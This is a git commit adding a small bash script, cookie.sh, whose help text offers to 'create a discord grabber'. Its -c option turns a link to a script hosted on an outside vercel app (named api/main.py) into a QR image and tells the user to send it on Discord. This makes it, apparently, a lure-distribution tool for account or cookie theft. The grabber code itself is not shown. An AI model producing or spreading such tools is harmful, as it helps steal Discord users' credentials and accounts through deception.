0721305930e7f3e34bb0be971b6bf349f3f5e1f5
0xyf77 <133903377+0xyf77@users.noreply.github.com>
2023-08-01 11:16:44 +0300

    Add files via upload

---
+++ cookie.sh
@@ -0,0 +1,43 @@
+#/bin/bash
+
+if ! command -v qrencode &> /dev/null; then
+    echo "ERROR: dependencies not installed, would you like to install them?"
+    read
+    brew install qrencode
+fi
+
+function print_help() {
+    cat ascii.txt
+    echo ""
+    echo "Usage: cookie [options]"
+    echo "Options:"
+    echo "-c            create a discord grabber"
+    echo "-h            show this help screen"
+}
+
+function create_grabber() {
+    qrencode -o image.jpg https://projectcookie-8ti3i08hv-0xyf77.vercel.app/api/main.py
+    echo "Now you can send this grabber on discord"
+    exit 1
+}
+if [ -z "$1" ]; then
+    print_help
+    exit 1
+fi
+
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        -h)
+         print_help
+         exit 0
+        ;;
+        -c)
+         create_grabber
+         exit 0
+        ;;
+        *)
+        echo "Invalid argument"
+        ;;
+    esac
+  shift
+done
